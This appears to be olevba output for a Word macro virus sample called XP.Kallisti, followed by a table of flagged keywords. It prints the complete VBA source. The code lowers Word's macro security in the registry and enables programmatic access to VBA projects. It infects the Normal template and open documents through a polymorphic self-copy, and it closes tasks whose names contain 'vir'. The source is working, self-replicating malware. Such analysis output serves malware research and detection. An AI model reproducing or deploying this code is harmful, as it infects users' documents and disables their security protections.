olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Listi-c44605c6f94b46ed5e3dde3d2d497b5e666dd2b1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Listi-c44605c6f94b46ed5e3dde3d2d497b5e666dd2b1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
ЊЗІ¦ћ = ЊЗІ¦ћ + 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
WordBasic.FileExit dlg
End If
If VBA.GetAttr(Word.Application.ActiveDocument.FullName) = ЊЗІ¦ћ Then
VBA.SetAttr Word.Application.ActiveDocument.FullName, (Rnd * 0)
ActiveDocument.Reload
End If
VBA.SetAttr Word.Application.NormalTemplate.FullName, (Rnd * 0)
Options.SaveNormalPrompt = vbEmpty
Set ‰»Ј№­ = VBA.IIf(Word.Application.MacroContainer = Word.Application.ActiveDocument, Word.Application.NormalTemplate, Word.Application.ActiveDocument)
With ‰»Ј№­.VBProject
With .vbcomponents.Item(ЊЗІ¦ћ).Codemodule
If Not .lines(90, ЊЗІ¦ћ) Like "'XP*" Then
.deletelines ЊЗІ¦ћ, .countoflines
.insertlines ЊЗІ¦ћ, »ќ–Е°(Word.MacroContainer.VBProject.vbcomponents.Item(ЊЗІ¦ћ).Codemodule.lines(ЊЗІ¦ћ, 92))
If ‰»Ј№­ = Word.Application.ActiveDocument Then Word.Application.ActiveDocument.SaveAs Word.Application.ActiveDocument.FullName, wdFormatDocument
End If
End With
End With
For ™ЉЃ©І = ЊЗІ¦ћ To Word.Tasks.Count
If VBA.InStr(ЊЗІ¦ћ, VBA.LCase(Word.Tasks(™ЉЃ©І).Name), "vir") Then Word.Tasks(™ЉЃ©І).Close
Next
If VBA.InStr(ЊЗІ¦ћ, VBA.Time, "5") Then
ї‚ђ†€ = "Merlin"
Set ©ї‡Џі = CreateObject("Agent.Control.1")
©ї‡Џі.Connected = True
If VBA.IsObject(©ї‡Џі) Then
©ї‡Џі.Characters.Load ї‚ђ†€, ї‚ђ†€ & ".acs"
Set Ј›ЊµЖ = ©ї‡Џі.Characters(ї‚ђ†€)
With Ј›ЊµЖ
.Top = 100
.Left = 100
.LanguageID = &H409
.Show
End With
Ј›ЊµЖ.Play "Greet"
Ј›ЊµЖ.Speak "Hello, " & Word.Application.UserName & "!" & "\Vol=99"
Ј›ЊµЖ.Play "GetAttention"
Ј›ЊµЖ.Play "GetAttentionReturn"
Ј›ЊµЖ.Speak "I said: 'Hello " & Word.Application.UserName & "!" & Chr(39)
Ј›ЊµЖ.Play "Idle2_2"
Ј›ЊµЖ.Speak "Let me tell you something about a confused girl..."
Ј›ЊµЖ.Play "Idle1_1"
Ј›ЊµЖ.Speak "...once she turned around and thought,"
Ј›ЊµЖ.Play "Idle1_2"
Ј›ЊµЖ.Speak "how damn simple it is,"
Ј›ЊµЖ.Play "Idle1_1"
Ј›ЊµЖ.Speak "leaving a man she once loved,"
Ј›ЊµЖ.Play "Idle2_1"
Ј›ЊµЖ.Speak "but she did not notice,"
Ј›ЊµЖ.Play "Idle1_1"
Ј›ЊµЖ.Speak "that her heart had become deaf by the pain..."
Ј›ЊµЖ.Play "Acknowledge"
Ј›ЊµЖ.Play "Idle1_1"
Ј›ЊµЖ.Speak "Oh, I forgot..."
Ј›ЊµЖ.Play "Idle2_1"
Ј›ЊµЖ.Speak "I think you are infected with XP.Kallisti...(the first virus for Office XP ever)"
Ј›ЊµЖ.Play "Idle1_1"
Ј›ЊµЖ.Speak "Damn... I have to go now..."
Ј›ЊµЖ.MoveTo 800, 600
Ј›ЊµЖ.Play "Idle3_1"
Ј›ЊµЖ.Play "Wave"
Ј›ЊµЖ.Speak "Goodbye now " & Word.Application.UserName & "!"
Set Ё‡№џЈ = Ј›ЊµЖ.Hide
Do Until Ё‡№џЈ.Status = 0
VBA.DoEvents
Loop
©ї‡Џі.Characters.Unload ї‚ђ†€
End If
End If
End Sub
Private Function »ќ–Е°(°Ў€«µ) 'Oh my god, it's poly...xD
ЊЗІ¦ћ = ЊЗІ¦ћ + 1
Еї‚©Е = "»ќ–Е° °Ў€«µ Еї‚©Е Ўі¦§Ј ›џ•…“ К…ћњҐ Њ¤”°© ЊЗІ¦ћ ‰»Ј№­ ї‚ђ†€ ™ЉЃ©І ©ї‡Џі Ј›ЊµЖ Ё‡№џЈ "
Do
Њ¤”°© = VBA.Left(Еї‚©Е, VBA.InStr(Еї‚©Е, VBA.Chr(32)) - ЊЗІ¦ћ): Еї‚©Е = VBA.Mid(Еї‚©Е, VBA.InStr(Еї‚©Е, VBA.Chr(32)) + ЊЗІ¦ћ)
›џ•…“ = VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129))
Do
К…ћњҐ = VBA.InStr(К…ћњҐ + ЊЗІ¦ћ, VBA.LCase(°Ў€«µ), VBA.LCase(Њ¤”°©))
If К…ћњҐ Then °Ў€«µ = VBA.Mid(°Ў€«µ, ЊЗІ¦ћ, (К…ћњҐ - ЊЗІ¦ћ)) & ›џ•…“ & VBA.Mid(°Ў€«µ, (К…ћњҐ + VBA.Len(Њ¤”°©)))
Loop While К…ћњҐ
Loop While Еї‚©Е <> ""
»ќ–Е° = °Ў€«µ
End Function
'XP.Kallisti
'(c) 2001 jackie // linezer0
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

